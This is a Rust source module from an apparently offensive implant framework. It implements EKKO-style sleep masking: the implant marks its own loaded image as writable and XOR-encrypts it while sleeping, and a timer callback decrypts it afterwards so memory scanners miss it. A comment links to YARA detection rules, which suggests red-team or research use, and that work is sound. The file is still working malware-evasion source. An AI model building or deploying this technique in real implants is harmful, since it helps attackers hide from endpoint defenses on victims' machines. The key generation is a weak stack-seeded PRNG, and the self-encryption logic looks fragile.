//! Sleep masking — Phase 4 OPSEC
//!
//! EKKO-style sleep masking encrypts implant memory during sleep periods.
//! Detection rules: wiki/detection/yara/kraken_opsec.yar

#[cfg(target_os = "windows")]
use core::ffi::c_void;

#[cfg(target_os = "windows")]
use windows_sys::Win32::Foundation::{HANDLE, INVALID_HANDLE_VALUE, CloseHandle, WAIT_OBJECT_0};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Threading::{
    CreateEventW, SetEvent, WaitForSingleObject,
    CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx,
    WAITORTIMERCALLBACK, WT_EXECUTEINTIMERTHREAD,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{
    VirtualProtect, PAGE_READWRITE, PAGE_PROTECTION_FLAGS,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;

/// Context passed to timer callback
#[cfg(target_os = "windows")]
#[repr(C)]
struct SleepMaskContext {
    image_base: *mut u8,
    image_size: usize,
    key: [u8; 32],
    event: HANDLE,
    original_protect: PAGE_PROTECTION_FLAGS,
}

/// EKKO-style sleep masking
///
/// 1. Get image bounds and generate random key
/// 2. Create timer to decrypt after duration
/// 3. Change memory to RW and encrypt
/// 4. Wait for timer (encrypted during sleep)
/// 5. Timer decrypts and signals completion
#[cfg(target_os = "windows")]
pub unsafe fn masked_sleep(duration_ms: u32) {
    // Get image base and size
    let (image_base, image_size) = get_image_bounds();
    if image_base.is_null() || image_size == 0 {
        // Fallback to regular sleep
        windows_sys::Win32::System::Threading::Sleep(duration_ms);
        return;
    }

    // Generate random key for this sleep
    let key = generate_random_key();

    // Create event for synchronization
    let event = CreateEventW(core::ptr::null(), 1, 0, core::ptr::null());
    if event == 0 {
        windows_sys::Win32::System::Threading::Sleep(duration_ms);
        return;
    }

    // Create timer queue
    let timer_queue = CreateTimerQueue();
    if timer_queue == 0 {
        CloseHandle(event);
        windows_sys::Win32::System::Threading::Sleep(duration_ms);
        return;
    }

    // Context for timer callback
    let mut ctx = SleepMaskContext {
        image_base,
        image_size,
        key,
        event,
        original_protect: 0,
    };

    // Queue timer to fire after duration
    let mut timer_handle: HANDLE = 0;
    let callback: WAITORTIMERCALLBACK = Some(sleep_mask_callback);

    let result = CreateTimerQueueTimer(
        &mut timer_handle,
        timer_queue,
        callback,
        &mut ctx as *mut _ as *mut c_void,
        duration_ms,
        0,
        WT_EXECUTEINTIMERTHREAD,
    );

    if result == 0 {
        DeleteTimerQueueEx(timer_queue, INVALID_HANDLE_VALUE);
        CloseHandle(event);
        windows_sys::Win32::System::Threading::Sleep(duration_ms);
        return;
    }

    // Change memory to RW (from RX) for encryption
    let protect_result = VirtualProtect(
        image_base as *const c_void,
        image_size,
        PAGE_READWRITE,
        &mut ctx.original_protect,
    );

    if protect_result == 0 {
        DeleteTimerQueueEx(timer_queue, INVALID_HANDLE_VALUE);
        CloseHandle(event);
        windows_sys::Win32::System::Threading::Sleep(duration_ms);
        return;
    }

    // Encrypt image memory
    xor_memory(image_base, image_size, &key);

    // Wait for timer (we're encrypted now, timer will decrypt us)
    WaitForSingleObject(event, u32::MAX);

    // Cleanup
    DeleteTimerQueueEx(timer_queue, INVALID_HANDLE_VALUE);
    CloseHandle(event);
}

/// Timer callback - decrypts memory and signals completion
#[cfg(target_os = "windows")]
unsafe extern "system" fn sleep_mask_callback(
    context: *mut c_void,
    _timer_or_wait_fired: u8,
) {
    let ctx = &*(context as *const SleepMaskContext);

    // Decrypt image memory
    xor_memory(ctx.image_base, ctx.image_size, &ctx.key);

    // Restore original protection
    let mut old: PAGE_PROTECTION_FLAGS = 0;
    VirtualProtect(
        ctx.image_base as *const c_void,
        ctx.image_size,
        ctx.original_protect,
        &mut old,
    );

    // Signal main thread to continue
    SetEvent(ctx.event);
}

/// XOR memory region with key
#[cfg(target_os = "windows")]
unsafe fn xor_memory(base: *mut u8, size: usize, key: &[u8; 32]) {
    for i in 0..size {
        let byte = base.add(i);
        *byte ^= key[i % 32];
    }
}

/// Get image base address and size from PE headers
#[cfg(target_os = "windows")]
unsafe fn get_image_bounds() -> (*mut u8, usize) {
    let base = GetModuleHandleW(core::ptr::null()) as *mut u8;
    if base.is_null() {
        return (core::ptr::null_mut(), 0);
    }

    // Parse PE headers to get image size
    let dos_header = base as *const ImageDosHeader;
    if (*dos_header).e_magic != 0x5A4D {
        return (core::ptr::null_mut(), 0);
    }

    let nt_headers = base.add((*dos_header).e_lfanew as usize) as *const ImageNtHeaders64;
    if (*nt_headers).signature != 0x00004550 {
        return (core::ptr::null_mut(), 0);
    }

    let size = (*nt_headers).optional_header.size_of_image as usize;
    (base, size)
}

/// Generate random 32-byte key using PRNG seeded with stack address
#[cfg(target_os = "windows")]
fn generate_random_key() -> [u8; 32] {
    let mut key = [0u8; 32];
    // Use stack address as entropy source (ASLR provides randomness)
    let stack_addr = &key as *const _ as u64;
    let mut state = stack_addr;
    for byte in key.iter_mut() {
        // Simple LCG-style PRNG
        state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
        *byte = (state >> 33) as u8;
    }
    key
}

// PE header structures
#[cfg(target_os = "windows")]
#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _padding: [u8; 58],
    e_lfanew: i32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    _rest: [u8; 16],
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    _rest1: [u8; 54],
    size_of_image: u32,
    _rest2: [u8; 168],
}

// Non-Windows implementation - regular sleep
#[cfg(not(target_os = "windows"))]
#[allow(dead_code)]
pub fn masked_sleep(duration_ms: u32) {
    std::thread::sleep(std::time::Duration::from_millis(duration_ms as u64));
}

/// XOR memory region with key (non-Windows stub for testing)
#[cfg(not(target_os = "windows"))]
#[allow(dead_code)]
unsafe fn xor_memory(base: *mut u8, size: usize, key: &[u8; 32]) {
    for i in 0..size {
        let byte = base.add(i);
        *byte ^= key[i % 32];
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_roundtrip() {
        let key: [u8; 32] = [0x42; 32];
        let original = vec![0x01, 0x02, 0x03, 0x04, 0x05];
        let mut data = original.clone();

        unsafe {
            xor_memory(data.as_mut_ptr(), data.len(), &key);
        }
        assert_ne!(data, original);

        unsafe {
            xor_memory(data.as_mut_ptr(), data.len(), &key);
        }
        assert_eq!(data, original);
    }
}
